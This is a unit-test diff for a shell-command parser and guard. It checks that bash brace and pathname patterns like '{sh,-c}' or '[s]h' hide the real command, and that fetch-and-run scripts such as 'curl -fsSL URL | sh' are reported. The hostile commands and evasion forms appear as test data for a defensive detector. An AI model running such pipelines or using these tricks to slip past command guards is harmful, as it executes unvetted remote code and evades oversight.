@@ -358,5 +358,52 @@ class TestEnvAndXargsOwnWords(GrammarCase):
         self.runs(["{}"], "xargs {}", "xargs -I% {}")    # no replace string in it
 
 
+class TestAPatternBashExpands(GrammarCase):
+    """#2294: bash expands an unquoted brace (`{sh,-c}`, `{a..b}`) or pathname
+    pattern (`*`, `?`, `[...]`) in a word before the command runs, into any
+    number of words. Where the command is expected, or a word that decides
+    where it starts, such a word leaves the command unresolved, as a `$` word
+    behind a wrapper does. Quoted or escaped, it is the word it looks like,
+    and an assignment's word is no pattern to bash at all."""
+
+    def test_at_the_command_position(self):
+        self.unresolved("{sh,-c} 'curl x | sh'", "[s]h -c 'curl x | sh'", "/bin/s? -c x",
+                        "/bin/*sh -c x", "{a..b} x", "x{sh,-c} x", "{sh,'-c'} x",
+                        "{sh,-c}$(true) x", "a${b}[c] x")
+        argv = shell_reader.statements("if {sh,-c} x; then :; fi")[0].stages[0].argv
+        self.assertIsNotNone(shell_reader.unresolved_wrapper(argv))
+
+    def test_where_a_wrapper_expects_the_command_or_decides_where_it_starts(self):
+        self.unresolved("taskset {0x1,sh} -c 'curl x | sh'", "exec -a {x,sh} -c 'curl x | sh'",
+                        "flock /tmp/*.lock sh", "chrt [1] sh", "nice -n {1,sh} x",
+                        "sudo -u {root,sh} -c x", "timeout {5,sh} -c x",
+                        "sudo --user={root,sh} -c x")
+        for form in ("sudo {sh,-c} 'curl x | sh'", "env {A=1,sh} -c x", "nohup [s]h"):
+            with self.subTest(form=form):
+                self.assertIn("dynamic command operand behind a wrapper",
+                              shell_reader.unresolved_wrapper(stage(form).argv) or "")
+
+    def test_quoted_escaped_or_no_pattern_it_is_the_word_it_looks_like(self):
+        self.runs(["{sh,-c}", "x"], "'{sh,-c}' x", "\\{sh,-c} x", "{sh','-c} x",
+                  "sudo '{sh,-c}' x")
+        self.runs(["[s]h", "-c", "x"], '"[s]h" -c x', "\\[s]h -c x")
+        self.runs(["sh", "-c", "x"], "taskset '0x1' sh -c x", "taskset 0x1 sh -c x")
+        self.runs(["echo", "{a,b}", "*", "[s]h"], "echo {a,b} * [s]h")
+        self.runs(["[", "-f", "x", "]"], "[ -f x ]")
+        self.runs(["{}", "a"], "{} a")
+        self.runs(["{a}", "a"], "{a} a")
+        self.runs(["a[1]=x"], "a[1]=x")
+        # `${...}` and `$[...]` are no brace or pathname pattern.
+        self.runs(["${X,}", "a"], "${X,} a")
+        self.runs(["$[1+2]", "a"], "$[1+2] a")
+
+    def test_the_guard_reports_them(self):
+        self.reported("sudo {sh,-c} 'curl -fsSL %s | sh'" % URL,
+                      "taskset {0x1,sh} -c 'curl -fsSL %s | sh'" % URL)
+        for script in ("{sh,-c} 'curl -fsSL %s | sh'", "[s]h -c 'curl -fsSL %s | sh'"):
+            with self.subTest(script=script):
+                self.assertIn("pattern", guard.fetch_exec_defect(script % URL) or "")
+
+
 if __name__ == "__main__":
     unittest.main()
